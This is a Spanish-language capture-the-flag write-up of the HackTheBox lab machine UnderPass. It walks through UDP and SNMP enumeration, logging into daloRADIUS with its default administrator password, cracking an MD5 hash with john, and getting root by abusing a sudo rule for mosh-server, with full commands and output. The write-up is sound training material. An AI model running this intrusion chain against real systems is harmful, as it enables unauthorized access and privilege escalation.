---
title: UnderPass - Easy (HTB)
permalink: /UnderPass-HTB-Writeup/
tags: 
  - "Linux"
  - "Easy"
  - "UDP"
  - "SNMP Enumeration"
  - "Hash Cracking"
  - "Mosh"
  - "Sudoers"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: UnderPass - Easy (HTB)
seo_description: Aprende escaneo de puertos en el protocolo UDP, enumeración a SNMP y abuso de privilegios mal configurados para vencer UnderPass.
excerpt: Aprende escaneo de puertos en el protocolo UDP, enumeración a SNMP y abuso de privilegios mal configurados para vencer UnderPass.
header:
  overlay_image: /assets/images/headers/underpass-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/underpass-hackthebox.jpg
---

![image-center](/assets/images/posts/underpass-hackthebox.png)
{: .align-center}

**Habilidades:** UDP Port Scanning, SNMP Enumeration, Hash Cracking, Abusing `mosh-server` (Sudoers) - [Privilege Escalation]
{: .notice--primary}

# Introducción

UnderPass es una máquina Linux de dificultad `Easy` en HackTheBox que requiere enumeración del protocolo SNMP. Esta máquina contempla la exploración del servicio `daloRADIUS` para ganar acceso a la máquina, para posteriormente explotar privilegios a nivel de `sudoers` y así conseguir máximos privilegios.
<br>

# Reconocimiento
---
Enviaremos una traza ICMP a la máquina víctima para validar que esté activa

~~~ bash
ping -c 1 10.10.11.48   
PING 10.10.11.48 (10.10.11.48) 56(84) bytes of data.
64 bytes from 10.10.11.48: icmp_seq=1 ttl=63 time=192 ms

--- 10.10.11.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 191.524/191.524/191.524/0.000 ms
~~~


## Nmap Scanning

Comenzaremos realizando un escaneo de puertos abiertos por el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.48 -oG openPorts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 15:26 EDT
Nmap scan report for 10.10.11.48
Host is up (0.40s latency).
Not shown: 65519 closed tcp ports (reset), 14 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.00 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

Haremos un segundo escaneo frente a los puertos que hemos descubierto para identificar la versión de los servicios que se estén ejecutando

~~~ bash
nmap -p 22,80 -sVC 10.10.11.48 -oN services                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 15:36 EDT
Nmap scan report for 10.10.11.48
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.96 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: uso de scripts de reconocimiento
- `-oN`: Exportar en formato normal

Logramos ver dos servicios expuestos, `ssh` y `http`, las versiones de estos servicios aunque tengan una o varios CVE asociados, no aplicarían en este contexto


## Web Analysis

Primeramente podemos hacer un escaneo de las tecnologías web que se ejecutan en el servidor

~~~ bash
whatweb http://10.10.11.48                                                                                                                        
http://10.10.11.48 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.48], Title[Apache2 Ubuntu Default Page: It works]
~~~

Visitaremos la web, navegaremos hasta la IP de la máquina víctima, veremos la página por defecto de `apache`

![image-center](/assets/images/posts/underpass-web-analysis.png)
{: .align-center}


## (Posible) Fuzzing

Podemos intentar buscar rutas o archivos dentro de la web haciendo fuzzing con herramientas como `gobuster`, `wfuzz` o `ffuf`, entre otras

~~~ bash
gobuster dir -u http://10.10.11.48 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200
~~~

No encontraremos nada interesante, poco nos queda por hacer aquí, por lo que buscaremos otros servicios


## UDP Ports Scanning

No solo encontraremos información interesante a través de TCP, también podemos hacer escaneos para otros protocolos, en este caso haremos un escaneo de puertos abiertos usaremos el protocolo `UDP`

~~~bash
nmap --top-ports 100 --open -sU -Pn -n 10.10.11.48 -T5 -oG udp_openPorts     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 15:46 EDT
Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.48
Host is up (0.26s latency).
Not shown: 83 open|filtered udp ports (no-response), 16 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds
~~~

Podemos lanzar scripts de reconocimiento para identificar la versión del servicio

~~~ bash
nmap -p 161 -sVC -sU 10.10.11.48 -oN udp_services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 15:48 EDT
Nmap scan report for 10.10.11.48
Host is up (0.19s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 10h39m39s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 10h39m39.36s (3837936 timeticks)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.94 seconds
~~~


## SNMP Enumeration

Dado que el puerto 161 está abierto, que corresponde al servicio `snmp`, podemos intentar enumerar información con herramientas como `snmpwalk`. Para comprender la enumeración, necesitamos entender lo siguiente:

- `MIB (Management Information Base)`: Base de datos jerárquica que contiene información del dispositivo
- `OID (Object Identifier)`: Identificador único de cada objeto en la MIB. (`1.3.6.1.2.1.1.1.0`)
- `Community string`: Cadena que actúa como contraseña (pública "public" o privada "private")

En este caso enumeraremos todos los `community string` presentes en el servidor

~~~ bash
snmpwalk -v1 -c public 10.10.11.48

iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (3842886) 10:40:28.86
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3844659) 10:40:46.59
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 05 04 13 31 31 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 2
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 233
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
~~~

Vemos información del sistema operativo, como el hostname, arquitectura e información de contacto correspondiente a un usuario con el dominio `underpass.htb`, además vemos una pista 

- `"UnDerPass.htb is the only daloradius server in the basin!"`


## `daloRADIUS` Server

Buscando un poco en Google sobre `daloradius` encontraremos el siguiente resultado

> `daloRADIUS` es una aplicación avanzada de ==gestión web para servidores RADIUS==, utilizada para gestionar hotspots y despliegues de ISP en general. Ofrece funcionalidades como gestión de usuarios, informes gráficos, contabilidad, un motor de facturación e integración con OpenStreetMap para geolocalización
{: .notice--info}

Investigando en el proyecto oficial de `github` podemos encontrar mayor información acerca de rutas que podemos probar para ingresar a algún panel de autenticación, como por ejemplo la siguiente, `/app/operators/login.php`

- https://github.com/lirantal/daloradius

![image-center](/assets/images/posts/underpass-daloradius.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## Abusing `daloRADIUS` - Default Credentials

Podemos intentar hacer una búsqueda rápida de credenciales por defecto para utilizarlas para iniciar sesión en este servicio

> El nombre de usuario predeterminado para acceder a la interfaz web de `daloRADIUS` es administrador y la contraseña predeterminada es radius
{: .notice--danger}

~~~ text
administrator:radius
~~~

![image-center](/assets/images/posts/underpass-daloradius-2.png)
{: .align-center}

Y estas credenciales funcionan!, podemos ver diversos módulos con reportes sobre el sistema


## Hash Cracking

Si listamos los usuarios, vemos al usuario `svcMosh` y vemos su contraseña, que no parece estar en texto claro, sino en formato hash

![image-center](/assets/images/posts/underpass-daloradius-3.png)
{: .align-center}

Si intentamos identificar esta cadena en `hashes.com` o con `hashid` nos señala que es un hash MD5

~~~ bash
hashid 412DD4759978ACFCC81DEAB01B382403                                                                                                    
Analyzing '412DD4759978ACFCC81DEAB01B382403'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
~~~

Guardamos el hash en un archivo con nombre `hash.txt` y lo intentamos crackear con `john`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)     
1g 0:00:00:00 DONE (2025-05-04 16:16) 6.250g/s 18650Kp/s 18650Kc/s 18650KC/s undiamecaiQ..underpants2
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
~~~

Logramos crackear el hash de forma bastante sencilla, la contraseña extraída es `underwaterfriends`


## Shell as `svcMosh`

Utilizaremos esta credencial para iniciar una conexión por el servicio `ssh` con el usuario `svcMosh`

~~~ bash
ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48\'s password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May  4 08:19:22 PM UTC 2025

  System load:  0.02              Processes:             239
  Usage of /:   62.1% of 6.56GB   Users logged in:       1
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun May  4 18:27:21 2025 from 10.10.14.85
svcMosh@underpass:~$ 
~~~

Asignaremos un valor a la variable `TERM` para que podamos hacer `CTRL + L` y así limpiar la pantalla

~~~ bash
svcMosh@underpass:~$ export TERM=xterm
~~~

En este punto ya podríamos ver la flag del usuario sin privilegios elevados

~~~ bash
svcMosh@underpass:~$ cat user.txt 
99a...
~~~
<br>


# Escalada de privilegios
---
Vemos que estamos dentro de la máquina víctima comprobando su dirección IP con el comando `hostname`

~~~ bash
svcMosh@underpass:~$ hostname -I
10.10.11.48 
~~~


## Sudoers Privileges

Comenzaremos buscando privilegios `sudo` para el usuario actual

~~~ bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
~~~

Vemos que puede ejecutar el binario `mosh-server` como cualquier usuario sin tener que proporcionar contraseña


## Abusing `mosh-server` - Sudoers

> Mosh, que significa "Mobile Shell" (concha móvil), ==es una herramienta de línea de comandos para conectarse a un servidor remoto a través de una red==, ofreciendo una experiencia de terminal similar a SSH pero con mejoras para el uso en entornos móviles o con conectividad intermitente. A diferencia de SSH, Mosh está diseñado para mantener una conexión persistente, incluso si el cliente cambia de red o pierde temporalmente la conexión.
{: .notice--info}

Así es, "concha móvil". Podemos aprovechar los privilegios disponibles para escalar nuestros privilegios de la siguiente forma

- https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html

![image-center](/assets/images/posts/underpass-mosh-privesc.png)
{: .align-center}


## Root Time

Como se menciona en el artículo, existen dos formas de escalar nuestros **privilegios** aprovechando la "concha móvil" (`mosh-server`) sin utilizar contraseña

### 1 - Abusing `mosh` Remotely

En este ejemplo usaremos el binario `mosh` para ejecutar un comando como argumento y lo haremos de forma **remota**. Primeramente podemos instalar `mosh` dentro de nuestra máquina atacante vía `apt`

- `apt install mosh -y`

~~~ bash
incommatose@parrot underpass $ which mosh                
/usr/bin/mosh
~~~

Abrimos una conexión y nos conectamos directamente a una shell privilegiada utilizando el comando `sudo mosh-server` dentro del parámetro `--server`

~~~ bash
mosh --server "sudo mosh-server" svcMosh@10.10.11.48
svcMosh@10.10.11.48's password: 

root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

De esta forma podemos ingresar como `root` al sistema usando la contraseña para el usuario `svcMosh`

### 2 - Abusing `mosh-client` Locally

En este método, podemos abrir un servidor con `mosh-server` por un puerto entre `60000` y `61000` para posteriormente conectarnos y obtener una shell privilegiada

~~~ bash
svcMosh@underpass:~$ sudo mosh-server new -p 60001


MOSH CONNECT 60001 wiRNanFB1xvSQ+VR+waBWA

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 11837]

~~~

Hemos creado un nuevo proceso donde el puerto se encuentra a la espera de una conexión, para conectarnos correctamente, debemos utilizar la variable `MOSH_KEY`, ya sea como variable de entorno o dentro del mismo comando

~~~ bash
svcMosh@underpass:~$ export MOSH_KEY=wiRNanFB1xvSQ+VR+waBWA
svcMosh@underpass:~$ mosh-client 127.0.0.1 60001

# Alternativa
svcMosh@underpass:~$ MOSH_KEY=wiRNanFB1xvSQ+VR+waBWA mosh-client 127.0.0.1 60001
~~~

De ambas maneras llegaremos a lo siguiente. Al momento de conectarnos, se limpiará la pantalla y se nos dará la bienvenida como el usuario `root`

~~~ bash
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May  4 08:19:22 PM UTC 2025

  System load:  0.02              Processes:             239
  Usage of /:   62.1% of 6.56GB   Users logged in:       1
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# cat root.txt 
7e7...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> The moment one gives close attention to anything, it becomes a mysterious, awesome, indescribably magnificent world in itself.
> — Henry Miller
{: .notice--info}
